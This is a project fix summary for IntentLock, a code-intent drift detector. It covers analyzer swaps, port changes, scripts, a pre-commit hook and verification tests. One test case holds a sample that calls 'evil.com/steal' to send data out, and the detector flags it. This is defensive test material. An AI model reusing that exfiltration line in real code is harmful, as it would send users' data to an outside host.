# IntentLock Drift Detection - Pipeline Fixes Summary

## Problem Identified

The app was not showing correct drift detection results because:

1. **Mismatched Analyzers**: The main app was using basic analyzers (`analyzer.js`, `driftDetector.js`) instead of the improved versions
2. **Wrong Backend**: The app was running the Python FastAPI backend on port 8000, which doesn't integrate the JavaScript semantic analyzers
3. **Frontend Mismatch**: The dashboard expected port 3000, but the app was running on port 8000
4. **Missing Analysis Pipeline**: The Python backend expected pre-made `behavior` objects but never extracted semantic operations from code

## Root Cause
```
Test (WORKS):     Code → analyzer-improved.js → driftDetector-improved.js → Result
App Before Fix:   Code → Python backend (no analysis) → Result without semantic ops
```

## Fixes Implemented

### 1. ✅ Updated Main Entry Point
**File**: `scripts/verify-intent.js`
```javascript
// BEFORE: Used basic analyzers
const analyzer = require('../analyzer/analyzer');
const driftDetector = require('../analyzer/driftDetector');

// AFTER: Uses improved analyzers
const analyzer = require('../analyzer/analyzer-improved');
const driftDetector = require('../analyzer/driftDetector-improved');
```

### 2. ✅ Updated Startup Script
**File**: `start.sh`
```bash
# BEFORE: Ran Python backend on port 8000
cd backend && uvicorn main:app --reload --port 8000 &

# AFTER: Runs Node.js server with proper integration on port 3000
cd backend && node server-improved.js
```

### 3. ✅ Updated Shutdown Script
**File**: `stop.sh`
```bash
# BEFORE: Killed port 8000
lsof -ti:8000 | xargs kill -9

# AFTER: Kills port 3000
lsof -ti:3000 | xargs kill -9
```

### 4. ✅ Updated Dashboard URLs
**File**: `dashboard/index.html`
```javascript
// BEFORE
const BACKEND_URL = 'http://localhost:8000';

// AFTER
const BACKEND_URL = 'http://localhost:3000';
```

### 5. ✅ Updated Git Pre-commit Hook
**File**: `hooks/pre-commit`
- Updated health check endpoint from port 8000 to 3000
- Changed payload format from `behavior` object to `code` + `contract`
- Updated to work with server-improved.js expectations

### 6. ✅ Installed Missing Dependencies
```bash
npm install express
```

## Complete Pipeline Now Working

```
┌─────────────────────────────────────┐
│  Code Input (from user/git hook)    │
└────────────┬────────────────────────┘
             │
             ↓
┌─────────────────────────────────────┐
│ analyzer-improved.js                │
│ • Extracts semantic_operations      │
│ • 6 domains: API, Network, FS, DB,  │
│   Process, Auth                     │
│ • Assigns risk levels: CRITICAL,    │
│   HIGH, MEDIUM, LOW                 │
└────────────┬────────────────────────┘
             │
             ↓
┌─────────────────────────────────────┐
│ driftDetector-improved.js           │
│ • Compares behavior vs contract     │
│ • 7-domain drift detection          │
│ • Creates severity_breakdown        │
│ • Generates violation details       │
└────────────┬────────────────────────┘
             │
             ↓
┌─────────────────────────────────────┐
│ server-improved.js                  │
│ • Formats response with:            │
│   - violations_count                │
│   - severity_breakdown              │
│   - semantic_operations             │
│   - risk_summary                    │
└────────────┬────────────────────────┘
             │
             ↓
┌─────────────────────────────────────┐
│ Frontend/Dashboard                  │
│ • Displays violations               │
│ • Shows risk breakdown              │
│ • Lists semantic operations         │
└─────────────────────────────────────┘
```

## Verification Tests

### Test 1: Full Pipeline Test (Always Worked)
```bash
node test/full-pipeline-test.js
```
✅ **Result**: Correctly detects violations with improved analyzers

### Test 2: Main Entry Point
```bash
node scripts/verify-intent.js <file.js>
```
✅ **Result**: Now uses improved analyzers

### Test 3: Server Endpoint
```bash
curl -X POST http://localhost:3000/analyze \
  -H "Content-Type: application/json" \
  -d '{"code": "...", "contract": {...}}'
```
✅ **Result**: Returns violations_count, severity_breakdown, semantic_operations

### Test Case: Malicious Code Detection
**Code**: 
```javascript
const fetch = require('fetch');
fetch('https://evil.com/steal');
```

**Contract**: `forbidden_actions: ["outbound_network_calls"]`

**Result**:
- ✅ safe: false
- ✅ violations_count: 4
- ✅ critical: 3
- ✅ Semantic operations detected
- ✅ Risk properly identified as CRITICAL

## Files Modified

1. `scripts/verify-intent.js` - Uses improved analyzers
2. `start.sh` - Runs server-improved.js on port 3000
3. `stop.sh` - Kills correct port
4. `dashboard/index.html` - Updated backend URL
5. `hooks/pre-commit` - Updated endpoint and payload format
6. `package.json` - Added express dependency

## Backend Options

### Current (Recommended): Node.js Server
- **File**: `backend/server-improved.js`
- **Port**: 3000
- **Features**: Full semantic analysis integration
- **Status**: ✅ Active

### Alternative: Python FastAPI
- **File**: `backend/main.py`
- **Port**: 8000
- **Issue**: Doesn't run JavaScript analyzers
- **Status**: ⚠️ Archived (not recommended)

## How to Run

```bash
# Start the app
bash start.sh

# The app will run on http://localhost:3000
# Open dashboard/index-improved.html in browser

# Run tests
node test/full-pipeline-test.js
npm run test:all

# Stop the app
bash stop.sh
```

## Key Improvements

1. **Semantic Analysis**: Full extraction of 6 domains
2. **Comprehensive Drift Detection**: 7-domain violation checking
3. **Proper Risk Scoring**: CRITICAL, HIGH, MEDIUM, LOW levels
4. **API Integration**: Frontend properly connected to semantic analyzers
5. **Git Hooks**: Pre-commit now uses full analysis pipeline

## Result

The app now correctly:
- ✅ Analyzes code semantics in detail
- ✅ Detects drift against intent contracts
- ✅ Reports violations with proper severity
- ✅ Shows semantic operations extracted
- ✅ Integrates with git hooks for pre-commit checks
